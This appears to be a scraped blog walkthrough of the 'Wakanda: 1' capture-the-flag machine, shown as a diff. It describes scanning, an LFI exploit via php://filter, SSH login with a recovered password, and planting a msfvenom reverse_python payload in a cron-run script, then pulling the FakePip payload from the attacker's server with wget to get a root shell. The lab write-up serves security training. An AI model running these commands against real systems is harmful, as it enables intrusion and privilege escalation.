@@ -1,0 +1,354 @@
+
+								
+																		Hack the Wakanda: 1 (CTF Challenge)
+								
+								
+								
+								
+									
+										posted inCTF Challenges									
+									
+									
+									on August 11, 2018
+									
+									 by										
+											Raj Chandel
+										
+										
+									
+									
+									
+									
+	SHARE
+	
+	
+		
+			
+			
+			
+				(function(d, s, id)
+				{
+					var js, fjs = d.getElementsByTagName(s)[0];
+					if (d.getElementById(id)) return;
+					js = d.createElement(s); js.id = id;
+					js.src = "//connect.facebook.net/en_US/all.js#xfbml=1";
+					fjs.parentNode.insertBefore(js, fjs);
+				}(document, 'script', 'facebook-jssdk'));
+			
+			
+			
+		
+		
+		
+		
+						Tweet
+			
+			
+				!function(d, s, id)
+				{
+					var js,fjs=d.getElementsByTagName(s)[0];if(!d.getElementById(id)){js=d.createElement(s);js.id=id;js.src="//platform.twitter.com/widgets.js";fjs.parentNode.insertBefore(js,fjs);}
+				}(document, "script", "twitter-wjs");
+			
+		
+		
+		
+		
+			
+			
+			
+			
+			
+			  (function()
+			  {
+				var po = document.createElement('script'); po.type = 'text/javascript'; po.async = true;
+				po.src = 'https://apis.google.com/js/plusone.js';
+				var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(po, s);
+			  })();
+			
+		
+		
+		
+		
+						
+			
+			
+			
+		
+		
+	
+	
+	
+									
+																	
+								
+								
+																
+								
+									Hello friends! Today we are going to take another CTF challenge known as Wakanda and it is another capture the flag challenge provided for practice. So let’s try to break through it. But before please note that you can download it from here.
+Security Level: Intermediate
+Flags: There are three flags (flag1.txt, flag2.txt, root.txt)
+Penetrating Methodologies
+
+Network Scanning (Nmap, netdiscover)
+HTTP service enumeration
+Exploiting LFI using php filter
+Decode the base 64 encoded text for password
+SSH Login
+Get 1st Flag
+Finding files owned by devops
+Overwrite antivirus.py via malicious python code
+Get netcat session
+Get 2nd flag
+Sudo Privilege Escalation
+Exploit Fake Pip
+Get the Root access and Capture the 3rd flag
+
+WalkThrough
+Let’s start off with scanning the network to find our target.
+
+		
+		
+			
+			
+			
+			
+netdiscover
+			
+				
+					
+				
+					1
+				
+						netdiscover
+					
+				
+			
+		
+
+
+We found our target –&gt; 192.168.1.124
+Our next step is to scan our target with NMAP.
+
+		
+		
+			
+			
+			
+			
+nmap -p- -A 192.168.1.124
+			
+				
+					
+				
+					1
+				
+						nmap -p- -A 192.168.1.124
+					
+				
+			
+		
+
+
+The NMAP output shows us that there are 4 ports open: 80 (HTTP), 111 (RPC), 333(SSH), 48920(RPC)
+Browsed the URL http://192.168.1.124 and poked around; however, we were not able to get any significant clues to move forward  
+
+We didn’t find anything on the webpage so we use dirb to enumerate the directories.
+
+		
+		
+			
+			
+			
+			
+dirb http://192.168.1.124
+			
+				
+					
+				
+					1
+				
+						dirb http://192.168.1.124
+					
+				
+			
+		
+
+
+All the pages that we find in the dirb scan have size zero and we don’t find any content on any of the pages. We take a look at the source page of the index file and we find a “lang” parameter commented inside the page.
+
+We use the “lang” parameter, just like it was shown in the page and find the text has been converted into French. Now we check if the “lang” parameter is vulnerable to LFI.
+
+We are able to exploit the LFI vulnerability using “php://filter/convert.base64-encode” function and access the index page.
+
+		
+		
+			
+			
+			
+			
+curl http://192.168.1.124/?lang=php://filter/convert.base64-encode/resource=index
+			
+				
+					
+				
+					1
+				
+						curl http://192.168.1.124/?lang=php://filter/convert.base64-encode/resource=index
+					
+				
+			
+		
+
+
+We decode the base64 encoded string and find the password “Niamey4Ever227!!!”. On the page, we find that “mamadou” is the author. We use these credentials to login through ssh on the target machine.
+
+When we login through ssh we get a python IDE prompt. We import the pty module and spawn ‘/bin/bash’ shell. We take a look at the home directory for user mamaduo and find the first flag.
+
+		
+		
+			
+			
+			
+			
+ssh mamaduo@192.168.1.124 -p 3333
+			
+				
+					
+				
+					1
+				
+						ssh mamaduo@192.168.1.124 -p 3333
+					
+				
+			
+		
+
+
+Enumerating through the directories, inside /tmp directory we find a file called test. We open it and find nothing interesting, but when we take a closer look at the file we find it that is owned by a devops. Now we find all the files owned by user devops and find a file called “.antivirus.py” inside /srv directory.
+
+		
+		
+			
+			
+			
+			
+find / -user devops 2&gt;/dev/null
+			
+				
+					
+				
+					1
+				
+						find / -user devops 2&gt;/dev/null
+					
+				
+			
+		
+
+
+Now when we open the python file we find that it is opening and test file and writing “test” inside it. To exploit this, we replace the code with shellcode. First, we create a msfvenom payload.
+
+		
+		
+			
+			
+			
+			
+msfvenom -p cmd/unix/reverse_python lhost=192.168.1.134 lport=4444 R
+			
+				
+					
+				
+					1
+				
+						msfvenom -p cmd/unix/reverse_python lhost=192.168.1.134 lport=4444 R
+					
+				
+			
+		
+
+
+After creating the payload, we open the “. antivirus.py” file and comment out the earlier code and insert our payload without adding “python -c”.
+
+We set up our listener using netcat, we wait for a few minutes for the script to get executed. As soon as the script is executed we get a reverse shell. When we check the UID we find that we spawned a shell for devops. Now we go to /home/devops directory and find the second flag. After getting the second flag we find that we can execute pip is a superuser without root.
+
+Now there is a script called Fakepip (download here), that can be used to exploit this vulnerability.
+
+We download the fakepip script into our system to edit the payload inside.
+
+		
+		
+			
+			
+			
+			
+git clone https://github.com/0x00-0x00/FakePip.git
+			
+				
+					
+				
+					1
+				
+						git clone https://github.com/0x00-0x00/FakePip.git
+					
+				
+			
+		
+
+We edit the payload inside os.system function.
+
+We decode the base64 encoded string and change the IP address to our IP address. Then we again convert the string to base64 and replace the older string with the new one.
+
+We start the python server on our system so that we can upload the FakePip script into the target machine.
+
+		
+		
+			
+			
+			
+			
+python -m SimpleHTTPServer 80
+			
+				
+					
+				
+					1
+				
+						python -m SimpleHTTPServer 80
+					
+				
+			
+		
+
+
+After we start HTTP server, we download the script on the target machine using wget. Now execute the command as per the instructions were given to us on the FakePip readme file.
+
+		
+		
+			
+			
+			
+			
+wget http://192.168.1.134/setup.py
+sudo pip install . --upgrade --force-reinstall
+			
+				
+					
+				
+					12
+				
+						wget http://192.168.1.134/setup.pysudo pip install . --upgrade --force-reinstall
+					
+				
+			
+		
+
+
+As soon as we run the command we get a reverse shell as the root user. We now go to the root directory and find the root flag.
+
+Author: Sayantan Bera is a technical writer at hacking articles and cybersecurity enthusiast. Contact Here
+Share this:Click to share on Twitter (Opens in new window)Click to share on Facebook (Opens in new window)Like this:Like Loading...									
+																	
+								
+								
+															
